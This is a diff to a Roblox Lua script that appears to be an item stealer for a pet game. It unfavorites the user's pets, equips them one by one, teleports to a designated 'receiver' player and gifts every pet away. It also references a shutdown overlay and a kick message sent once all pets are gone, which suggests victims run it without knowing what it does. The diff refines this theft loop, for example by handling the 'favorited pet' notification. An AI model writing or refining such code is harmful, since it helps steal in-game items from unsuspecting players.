@@ -463,26 +463,13 @@ local function isPetFavorited(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if not pet then return false end
     
-    -- Check for favorite icon in descendants
     for _, descendant in ipairs(pet:GetDescendants()) do
         if descendant:IsA("ImageLabel") and descendant.Name == "FavoriteIcon" then
             return true
         end
     end
     
-    -- Check for favorite attribute
-    if pet:GetAttribute("Favorited") then
-        return true
-    end
-    
-    -- Check for favorite notification
-    for _, gui in ipairs(CoreGui:GetDescendants()) do
-        if gui:IsA("TextLabel") and gui.Text:lower():find("cannot gift a favorited pet") then
-            return true
-        end
-    end
-    
-    return false
+    return pet:GetAttribute("Favorited") or false
 end
 
 local function unfavoritePet(petName)
@@ -490,7 +477,6 @@ local function unfavoritePet(petName)
     if pet then
         if isPetFavorited(petName) then
             ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-            task.wait(0.5)
             return true
         end
     end
@@ -505,7 +491,6 @@ local function equipSinglePet(petName)
     local character = LocalPlayer.Character
     if not character then return false end
 
-    -- Unequip all pets first
     for _, item in ipairs(character:GetChildren()) do
         if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
             item.Parent = LocalPlayer.Backpack
@@ -515,7 +500,6 @@ local function equipSinglePet(petName)
     local pet = LocalPlayer.Backpack:FindFirstChild(petName)
     if pet then
         pet.Parent = character
-        task.wait(0.5) -- Wait for pet to equip
         return true
     end
     return false
@@ -535,7 +519,7 @@ local function teleportToPlayer(targetPlayer)
     
     if LocalPlayer.Character:FindFirstChildOfClass('Humanoid') and LocalPlayer.Character:FindFirstChildOfClass('Humanoid').SeatPart then
         LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
-        task.wait(0.1)
+        wait(.1)
     end
     
     root.CFrame = targetRoot.CFrame + Vector3.new(3,1,0)
@@ -548,6 +532,15 @@ local function isReceiverInGame()
         if player then return player end
     end
     return nil
+end
+
+local function checkForGiftNotification()
+    for _, gui in ipairs(CoreGui:GetDescendants()) do
+        if gui:IsA("TextLabel") and gui.Text:lower():find("you can only place your pets in your garden!") then
+            return true
+        end
+    end
+    return false
 end
 
 local shutdownGui
@@ -716,16 +709,15 @@ local function startGifting(targetPlayer)
         end
 
         local pets = getPetsInventory()
-        if #pets == 0 then 
-            if shutdownGui then
-                shutdownGui:Destroy()
-            end
-            LocalPlayer:Kick("All pets gifted successfully")
-            break
-        end
+        if #pets == 0 then break end
 
         for _, pet in ipairs(pets) do
-            -- Always use Delta-style gifting for all executors
+            if checkForGiftNotification() then
+                if unfavoritePet(pet.fullName) then
+                    task.wait(1)
+                end
+            end
+
             if equipSinglePet(pet.fullName) then
                 local attempts = 0
                 local success = false
